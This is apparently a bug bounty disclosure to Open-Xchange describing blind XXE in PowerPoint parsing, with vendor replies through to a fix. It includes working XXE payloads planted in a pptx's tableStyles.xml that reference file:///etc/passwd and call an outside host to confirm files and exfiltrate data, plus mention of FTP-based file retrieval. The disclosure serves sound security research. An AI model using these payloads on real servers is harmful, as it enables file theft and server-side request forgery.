title: Blind XXE via Powerpoint files

profile.name: Open-Xchange
profile.about: Messaging, collaboration and office productivity software for service providers

vulnerability_information:
## Summary
During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server. I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here: 
http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html.

 I'll try to follow up with a full poc for reading files later today/tomorrow.

## Steps to Reproduce
1. Create a powerpoint slide.
2. Open the created file using winrar (a pptx file is actually an archive).
3. Extract the tableStyles.xml file which is located in the ppt folder and open it in your favorite editor. It should look something like this:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
```
Now, setup a server where you can view incoming connections and save the file to look like this:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "https://{your-address}/">]><r>&sp;</r>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
```

4. Put the updated file back into the pptx by dragging it to the ppt folder.
5. Upload the file to Open-XChange and open it up. 
6. Check your server logs and see that a request from the user agent: Java/1.8.0_131 was sent.


## Payload to view if a file exists on the server

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY sp SYSTEM "https://{your-server}/">]><r>&xxe;&sp;</r>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
```

If you receive a request to the server this means the file exists. For example this payload:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwdafasdfqwe"><!ENTITY sp SYSTEM "https://recorder.run.aws-usw02-pr.ice.predix.io/">]><r>&xxe;&sp;</r>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
```

will not generate an http request to your server.

## Impact

An attacker can extract different data from the server (possibly read local files), and make arbitrary request to any server.
vulnerability_information_html:
Summary

During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server. I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here:
http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html.

I'll try to follow up with a full poc for reading files later today/tomorrow.

Steps to Reproduce

  1. Create a powerpoint slide.
  2. Open the created file using winrar (a pptx file is actually an archive).
  3. Extract the tableStyles.xml file which is located in the ppt folder and open it in your favorite editor. It should look something like this:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>

Now, setup a server where you can view incoming connections and save the file to look like this:

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "https://{your-address}/">]><r>&sp;</r>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
  1. Put the updated file back into the pptx by dragging it to the ppt folder.
  2. Upload the file to Open-XChange and open it up.
  3. Check your server logs and see that a request from the user agent: Java/1.8.0_131 was sent.

Payload to view if a file exists on the server

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY sp SYSTEM "https://{your-server}/">]><r>&xxe;&sp;</r>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>

If you receive a request to the server this means the file exists. For example this payload:

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwdafasdfqwe"><!ENTITY sp SYSTEM "https://recorder.run.aws-usw02-pr.ice.predix.io/">]><r>&xxe;&sp;</r>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>

will not generate an http request to your server.

Impact

An attacker can extract different data from the server (possibly read local files), and make arbitrary request to any server.

activities.message:
Hey,

It seems that during my testing I have caused an overloading of connections (or you have deployed a code change?) and my POC doesn't work anymore. Instead I see: Error code: ERROR_SERVER_DENIES_CONNECTION. File id: 46/179.
activities.markdown_message:
Hey,

It seems that during my testing I have caused an overloading of connections (or you have deployed a code change?) and my POC doesn't work anymore. Instead I see: Error code: ERROR_SERVER_DENIES_CONNECTION. File id: 46/179.

activities.message: Hi @mishre thank you very much for reporting this issue to us. We have not yet deployed a code change but it could be that you or another researcher has triggered a DoS protection which limits requests per second and leads to a lock-out of the user account for some minutes.
activities.markdown_message: Hi @mishre thank you very much for reporting this issue to us. We have not yet deployed a code change but it could be that you or another researcher has triggered a DoS protection which limits requests per second and leads to a lock-out of the user account for some minutes.

activities.message:
Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.

We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories "researcher credits"?
activities.markdown_message:
Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.

We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories "researcher credits"?

activities.message:
Yes, It would be nice to be credited as Michael Reizelman.

I'll try to check the vector for reading local files again, later today (pretty sure it's possible).
activities.markdown_message:
Yes, It would be nice to be credited as Michael Reizelman.

I'll try to check the vector for reading local files again, later today (pretty sure it's possible).

activities.message: I have been trying to exploit this issue using the FTP method, but it seems that the server still denies all connections. Guessing that I will not be able to test this for full exploitation to read files unless this error is resolved.
activities.markdown_message: I have been trying to exploit this issue using the FTP method, but it seems that the server still denies all connections. Guessing that I will not be able to test this for full exploitation to read files unless this error is resolved.

activities.message: Try again, if it happens again please provide the user ID in question. Once you're done with your research on this topic let me know to come to a bounty decision based on all the findings for this vector.
activities.markdown_message: Try again, if it happens again please provide the user ID in question. Once you're done with your research on this topic let me know to come to a bounty decision based on all the findings for this vector.

activities.message:
Hi,
As a poc, I was able to retrieve the /etc/hostname file from the server. Attaching the relevant tableStyles.xml I have used, as well as the whole pptx, and the code of the python server I have used for extraction. 

Upon opening the powerpoint document an inital http request, followed by ftp request which will reveal the file's contents:
```
sandbox-1
```
Hopefully this will clear things out.
activities.markdown_message:
Hi,
As a poc, I was able to retrieve the /etc/hostname file from the server. Attaching the relevant tableStyles.xml I have used, as well as the whole pptx, and the code of the python server I have used for extraction.

Upon opening the powerpoint document an inital http request, followed by ftp request which will reveal the file's contents:

sandbox-1

Hopefully this will clear things out.

activities.message: Nice job! :-) In the meantime we identified the root cause and are working on a solution.
activities.markdown_message: Nice job! :-) In the meantime we identified the root cause and are working on a solution.

activities.message: We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.
activities.markdown_message: We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.
